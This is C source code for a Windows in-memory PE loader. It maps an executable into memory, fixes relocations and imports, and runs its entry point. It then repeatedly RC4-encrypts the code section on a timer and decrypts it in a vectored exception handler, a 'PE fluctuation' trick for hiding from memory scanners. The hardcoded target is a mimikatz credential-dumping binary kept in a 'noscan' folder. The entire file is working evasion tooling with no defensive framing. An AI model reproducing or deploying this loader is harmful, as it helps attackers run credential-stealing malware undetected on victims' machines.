#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#define PRINT_WINAPI_ERR(cApiName) printf("[!] %s Failed With Error: %d\n", cApiName, GetLastError())

typedef struct _PE_HEADERS
{
	PBYTE                    pFileBuffer;
	DWORD                    dwFileSize;

	PIMAGE_NT_HEADERS        pImgNtHdrs;
	PIMAGE_SECTION_HEADER    pImgSecHdr;

	PIMAGE_DATA_DIRECTORY    pEntryImportDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryBaseRelocDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryTLSDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExceptionDataDir;
	PIMAGE_DATA_DIRECTORY    pEntryExportDataDir;

	BOOL                     bIsDLLFile;
} PE_HEADERS, *PPE_HEADERS;

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

typedef BOOL(WINAPI* MAIN)();

typedef struct _USTRING {
	DWORD Length;
	DWORD MaximumLength;
	unsigned char* Buffer;
} USTRING, *PUSTRING;

typedef NTSTATUS(WINAPI* pSystemFunction032)(PUSTRING uStrBuffer, PUSTRING uStrKey);

HANDLE g_hTimerQueue = INVALID_HANDLE_VALUE;
HANDLE g_hTimer = INVALID_HANDLE_VALUE;
ULONG_PTR g_uPeRXAddress = 0;
SIZE_T g_sPeRXSize = 0;


#define EXEC_WAIT 1
#define RC4_KEY_SIZE 0x10

BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	PBYTE pBuffer = NULL;
	DWORD dwFileSize = 0x00;
	DWORD dwNumberOfBytesRead = 0x00;
	printf("[+] Reading file\n");

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		PRINT_WINAPI_ERR("CreateFileA");
		goto _FUNC_CLEANUP;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
	{
		PRINT_WINAPI_ERR("GetFileSize");
		goto _FUNC_CLEANUP;
	}

	printf("[+] Bytes read: %d\n", dwFileSize);

	if ((pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL)
	{
		PRINT_WINAPI_ERR("HeapAlloc");
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead)
	{
		PRINT_WINAPI_ERR("ReadFile");
		goto _FUNC_CLEANUP;
	}

	*ppBuffer = pBuffer;
	*pdwFileSize = dwFileSize;

_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*ppBuffer && pBuffer)
		HeapFree(GetProcessHeap(), 0, pBuffer);

	return ((*ppBuffer != NULL) && (*pdwFileSize != 0)) ? TRUE : FALSE;
}

BOOL InitializePeStruct(OUT PPE_HEADERS pPeHeaders, IN PBYTE pFileBuffer, IN DWORD dwFileSize)
{
	printf("[+] Initializing PE Struct\n");
	if (!pPeHeaders || !pFileBuffer || !dwFileSize)
		return FALSE;

	pPeHeaders->pFileBuffer = pFileBuffer;
	pPeHeaders->dwFileSize = dwFileSize;
	pPeHeaders->pImgNtHdrs = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);

	if (pPeHeaders->pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pPeHeaders->bIsDLLFile = (pPeHeaders->pImgNtHdrs->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
	pPeHeaders->pImgSecHdr = IMAGE_FIRST_SECTION(pPeHeaders->pImgNtHdrs);
	pPeHeaders->pEntryImportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	pPeHeaders->pEntryBaseRelocDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	pPeHeaders->pEntryTLSDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	pPeHeaders->pEntryExceptionDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	pPeHeaders->pEntryExportDataDir = &pPeHeaders->pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	return TRUE;
}



BOOL FixRelocations(IN PIMAGE_DATA_DIRECTORY pEntryBaseRelocDataDir, IN ULONG_PTR pPeBaseAddress, IN ULONG_PTR pPreferableAddress)
{
	printf("[+] Fixing relocations\n");
	PIMAGE_BASE_RELOCATION pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)(pPeBaseAddress + pEntryBaseRelocDataDir->VirtualAddress);


	ULONG_PTR uDeltaOffset = pPeBaseAddress - pPreferableAddress;

	PBASE_RELOCATION_ENTRY pBaseRelocationEntry = NULL;

	while (pImgBaseRelocation->VirtualAddress)
	{
		pBaseRelocationEntry = (PBASE_RELOCATION_ENTRY)(pImgBaseRelocation + 1);

		while ((PBYTE)pBaseRelocationEntry != (PBYTE)pImgBaseRelocation + pImgBaseRelocation->SizeOfBlock)
		{
			switch (pBaseRelocationEntry->Type)
			{
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += (DWORD)uDeltaOffset;
				break;

			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += HIWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_LOW:
				*((WORD*)(pPeBaseAddress + pImgBaseRelocation->VirtualAddress + pBaseRelocationEntry->Offset)) += LOWORD(uDeltaOffset);
				break;

			case IMAGE_REL_BASED_ABSOLUTE:
				break;

			default:
				printf("Unknown relocation type %d | Offset: 0x%08X \n", pBaseRelocationEntry->Offset, pBaseRelocationEntry->Offset);
				return FALSE;
			}

			pBaseRelocationEntry++;
		}
		pImgBaseRelocation = (PIMAGE_BASE_RELOCATION)pBaseRelocationEntry;
	}
	return TRUE;
}

BOOL FixImportAddressTable(IN PIMAGE_DATA_DIRECTORY pEntryImportDataDir, IN PBYTE pPeBaseAddress)
{
	printf("[+] Fixing IAT\n");
	PIMAGE_IMPORT_DESCRIPTOR pImgDescriptor = NULL;

	for (SIZE_T i = 0; i < pEntryImportDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
	{
		pImgDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(pPeBaseAddress + pEntryImportDataDir->VirtualAddress + i);

		if (pImgDescriptor->OriginalFirstThunk == 0 && pImgDescriptor->FirstThunk == 0)
			break;


		LPSTR cDllName					 = (LPSTR)(pPeBaseAddress + pImgDescriptor->Name);
		ULONG_PTR uOriginalFirstThunkRVA = pImgDescriptor->OriginalFirstThunk;
		ULONG_PTR uFirstThunkRVA		 = pImgDescriptor->FirstThunk;
		SIZE_T ImgThunkSize				 = 0;
		HMODULE hModule					 = NULL;

		if (!(hModule = LoadLibraryA(cDllName)))
		{
			PRINT_WINAPI_ERR("LoadLibraryA");
			return FALSE;
		}

		while (TRUE)
		{
			PIMAGE_THUNK_DATA pOriginalFirstThunk  = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uOriginalFirstThunkRVA + ImgThunkSize);
			PIMAGE_THUNK_DATA pFirstThunk		   = (PIMAGE_THUNK_DATA)(pPeBaseAddress + uFirstThunkRVA + ImgThunkSize);
			PIMAGE_IMPORT_BY_NAME pImgImportByName = NULL;
			ULONG_PTR pFuncAddress				   = 0;

			if (pOriginalFirstThunk->u1.Function == 0 && pFirstThunk->u1.Function == 0)
				break;

			if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk->u1.Ordinal))
			{
				
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, MAKEINTRESOURCEA(IMAGE_ORDINAL(pOriginalFirstThunk->u1.Ordinal)))))
				{
					printf("Could not import !%s#%d\n", cDllName, (int)pOriginalFirstThunk->u1.Ordinal);
					return FALSE;
				}
			}
			else
			{
				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pPeBaseAddress + pOriginalFirstThunk->u1.AddressOfData);
				if (!(pFuncAddress = (ULONG_PTR)GetProcAddress(hModule, pImgImportByName->Name)))
				{
					printf("Could not import !%s.%s\n", cDllName, pImgImportByName->Name);
					return FALSE;
				}
			}

			pFirstThunk->u1.Function = (ULONGLONG)pFuncAddress;

			ImgThunkSize += sizeof(IMAGE_THUNK_DATA);

		}
	}
	return TRUE;
}

BOOL FixMemPermissions(IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHeaders, IN PIMAGE_SECTION_HEADER pImgSecHeader)
{
	printf("[+] Fixing Mem permissions\n");
	for (DWORD i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++)
	{
		DWORD dwProtection = 0;
		DWORD dwOldProtection = 0;

		if (!pImgSecHeader[i].SizeOfRawData || !pImgSecHeader[i].VirtualAddress)
			continue;

		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;


		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;

		
		if (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
		{
			if (!g_uPeRXAddress)
				// save RX base address
				g_uPeRXAddress = pPeBaseAddress + pImgSecHeader[i].VirtualAddress;

			if (!g_sPeRXSize)
				// save RX memory size
				g_sPeRXSize = pImgSecHeader[i].SizeOfRawData;

			dwProtection = PAGE_EXECUTE_READ;
		}


		if ((pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;


		if (!VirtualProtect((PVOID)(pPeBaseAddress + pImgSecHeader[i].VirtualAddress), pImgSecHeader[i].SizeOfRawData, dwProtection, &dwOldProtection))
		{
			PRINT_WINAPI_ERR("VirtualProtect");
			return FALSE;
		}
	}

	return TRUE;
}

PVOID FetchExportedFunctionAddress(IN PIMAGE_DATA_DIRECTORY pEntryExportDataDir, IN ULONG_PTR pPeBaseAddress, IN LPCSTR cFuncName)
{
	printf("[+] Getting Exported Func Addr\n");
	PIMAGE_EXPORT_DIRECTORY pImageExportDir = (PIMAGE_EXPORT_DIRECTORY)(pPeBaseAddress + pEntryExportDataDir->VirtualAddress);
	PDWORD FunctionNameArray = (PDWORD)(pPeBaseAddress + pImageExportDir->AddressOfNames);
	PDWORD FunctionAddressArray = (PDWORD)(pPeBaseAddress + pImageExportDir->AddressOfFunctions);
	PDWORD FunctionOrdinalArray = (PDWORD)(pPeBaseAddress + pImageExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImageExportDir->NumberOfFunctions; i++)
	{
		CHAR* pFunctionName = (CHAR*)(pPeBaseAddress + FunctionNameArray[i]);
		PVOID pFunctionAddress = (PVOID)(pPeBaseAddress + FunctionAddressArray[FunctionOrdinalArray[i]]);

			if (strcmp(cFuncName, pFunctionName) == 0)
			{
				return pFunctionAddress;
			}
	}
	return NULL;
}


BOOL Rc4EncryptDecrypt(IN PBYTE pBuffer, IN DWORD dwBufferLen, IN BOOL bDecrypt)
{
	NTSTATUS STATUS = 0;
	BYTE Rc4Key[RC4_KEY_SIZE] = { 0xFF, 0xDD, 0x79, 0x7F, 0x03, 0xA5, 0x87, 0xEF, 0x71, 0x4D, 0xDB, 0x7D, 0xF4, 0x47, 0x77, 0x01 };
	USTRING uStringBuffer = { .Buffer = pBuffer, .Length = dwBufferLen, .MaximumLength = dwBufferLen };
	USTRING uStringKey = { .Buffer = Rc4Key, .Length = RC4_KEY_SIZE, .MaximumLength = RC4_KEY_SIZE };

	pSystemFunction032 SystemFunction032 = (pSystemFunction032)GetProcAddress(LoadLibrary(TEXT("Advapi32")), "SystemFunction032");

	DWORD dwOldProtection = 0x00;

	if (!pBuffer || !dwBufferLen)
		return FALSE;

	// change permissions to RW to enc / dec
	if (!VirtualProtect(pBuffer, dwBufferLen, PAGE_READWRITE, &dwOldProtection))
	{
		PRINT_WINAPI_ERR("VirtualProtect [1]");
		return FALSE;
	}

	// enc / dec
	if ((STATUS = SystemFunction032(&uStringBuffer, &uStringKey)) != 0x00)
	{
		PRINT_WINAPI_ERR("SystemFunction032");
		return FALSE;
	}

	// set mem permission back to RO/RX
	if (!VirtualProtect(pBuffer, dwBufferLen, (bDecrypt == TRUE ? PAGE_EXECUTE_READ : PAGE_READONLY), &dwOldProtection))
	{
		PRINT_WINAPI_ERR("VirtualProtect [2]");
		return FALSE;
	}

	return TRUE;
}

VOID CALLBACK ObfuscatedTimerCallback(IN PVOID lpParameter, IN BOOLEAN TimerOrWaitFired)
{
	Rc4EncryptDecrypt((PBYTE)g_uPeRXAddress, (DWORD)g_sPeRXSize, FALSE);
}

LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
{
	printf("[!] Exception raised!\n");
	printf("\t> Code: 0x%0.8X \n", pExceptionInfo->ExceptionRecord->ExceptionCode);
	printf("\t> Address: 0x%p \n", pExceptionInfo->ExceptionRecord->ExceptionAddress);
	printf("\t> State: ");

	if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION)
	{
		// make sure exception address is in the RX (.text) section of the PE
		if ((ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) >= g_uPeRXAddress && (ULONG_PTR)(pExceptionInfo->ExceptionRecord->ExceptionAddress) <= (g_uPeRXAddress + (ULONG_PTR)g_sPeRXSize))
		{
			DWORD dwOldProtection = 0x00;
			printf("[*] HANDLED [*] \n");

			if (!g_hTimerQueue || !g_hTimer)
				goto _FAILURE;

			// decrypt data at g_uPeRXAddress and mark as RX
			if (!Rc4EncryptDecrypt((PBYTE)g_uPeRXAddress, (DWORD)g_sPeRXSize, TRUE))
				goto _FAILURE;


			// execute the obfuscationtimercallback func after EXEC_WAIT seconds
			if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)ObfuscatedTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
			{
				PRINT_WINAPI_ERR("CreateTimerQueueTimer");
				goto _FAILURE;
			}

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}
	printf("[-] UNHANDLED [-] \n");

_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}



BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
{
	if (!pPeHeaders)
		return FALSE;


	PBYTE pPeBaseAddress = NULL;
	PVOID pEntryPoint = NULL;
	PVOID pVeHandler = NULL;
	//PVOID pExportedFunctionAddress = NULL;

	if ((pPeBaseAddress = VirtualAlloc(NULL, pPeHeaders->pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == NULL)
	{
		PRINT_WINAPI_ERR("VirtualAlloc");
		return FALSE;
	}

	for (int i = 0; i < pPeHeaders->pImgNtHdrs->FileHeader.NumberOfSections; i++)
	{
		memcpy(
			(PVOID)(pPeBaseAddress + pPeHeaders->pImgSecHdr[i].VirtualAddress),
			(PVOID)(pPeHeaders->pFileBuffer + pPeHeaders->pImgSecHdr[i].PointerToRawData),
			pPeHeaders->pImgSecHdr[i].SizeOfRawData
		);
	}

	if (!FixRelocations(pPeHeaders->pEntryBaseRelocDataDir, (ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs->OptionalHeader.ImageBase))
		return FALSE;

	if (!FixImportAddressTable(pPeHeaders->pEntryImportDataDir, pPeBaseAddress))
		return FALSE;

	if (!FixMemPermissions((ULONG_PTR)pPeBaseAddress, pPeHeaders->pImgNtHdrs, pPeHeaders->pImgSecHdr))
		return FALSE;

	//if (pPeHeaders->pEntryExportDataDir->Size && pPeHeaders->pEntryExportDataDir->VirtualAddress && cExportedFuncName)
//		pExportedFunctionAddress = FetchExportedFunctionAddress(pPeHeaders->pEntryExportDataDir, (ULONG_PTR)pPeBaseAddress, cExportedFuncName);
	printf("[+] Performing PE Fluctuation on 0x%p [ %ld ]\n", (PVOID)g_uPeRXAddress, (ULONG)g_sPeRXSize);
	if (!g_uPeRXAddress || !g_sPeRXSize)
		return FALSE;

	// set exception handlers
	if (pPeHeaders->pEntryExceptionDataDir->Size)
	{
		PIMAGE_RUNTIME_FUNCTION_ENTRY pImgRuntimeFuncEntry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pPeBaseAddress + pPeHeaders->pEntryExceptionDataDir->VirtualAddress);
		if (!RtlAddFunctionTable(pImgRuntimeFuncEntry, (pPeHeaders->pEntryExceptionDataDir->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)), (DWORD64)pPeBaseAddress))
		{
			PRINT_WINAPI_ERR("RtlAddFunctionTable");
			return FALSE;
		}
	}

	// Register a VEH
	if (!(pVeHandler = AddVectoredExceptionHandler(0x01, VectoredExceptionHandler)))
	{
		PRINT_WINAPI_ERR("AddVectoredExceptionHandler");
		return FALSE;
	}

	// Execute TLS callbacks
	if (pPeHeaders->pEntryTLSDataDir->Size)
	{
		PIMAGE_TLS_DIRECTORY pImgTlsDirectory = (PIMAGE_TLS_DIRECTORY)(pPeBaseAddress + pPeHeaders->pEntryTLSDataDir->VirtualAddress);

		PIMAGE_TLS_CALLBACK* pImgTlsCallback = (PIMAGE_TLS_CALLBACK*)(pImgTlsDirectory->AddressOfCallBacks);
		for (int i = 0; pImgTlsCallback[i] != NULL; i++)
		{
			pImgTlsCallback[i]((LPVOID)pPeBaseAddress, DLL_PROCESS_ATTACH, NULL);
		}
	}
	
	pEntryPoint = (PVOID)(pPeBaseAddress + pPeHeaders->pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

	if (g_hTimerQueue == INVALID_HANDLE_VALUE)
		g_hTimerQueue = CreateTimerQueue();

	if (!CreateTimerQueueTimer(&g_hTimer, g_hTimerQueue, (WAITORTIMERCALLBACK)ObfuscatedTimerCallback, NULL, EXEC_WAIT * 1000, 0x00, 0x00))
	{
		PRINT_WINAPI_ERR("CreateTimerQueueTimer");
		return FALSE;
	}

	printf("[+] Executing Entrypoint\n");
	MAIN pMain = (MAIN)pEntryPoint;
	// ( *( VOID(*)() ) pEntryPoint )(); 
	return pMain();
}

#define GET_FILENAME(path) (strrchr(path, '\\') ? strrchr(path, '\\') + 1 : path)

int main(int argc, char* argv[])
{
	char* pe_arg = "C:\\Users\\Dylan Reuter\\Desktop\\noscan\\mimikatz\\x64\\mimikatz_11.exe";

	PBYTE pFileBuffer = NULL;
	DWORD dwFileSize = 0;
	PE_HEADERS peHeaders = { 0 };

	if (!ReadFileFromDisk(pe_arg, &pFileBuffer, &dwFileSize))
		return -1;

	if (!InitializePeStruct(&peHeaders, pFileBuffer, dwFileSize))
		return -1;

	LocalPeExec(&peHeaders);

	return 0;
}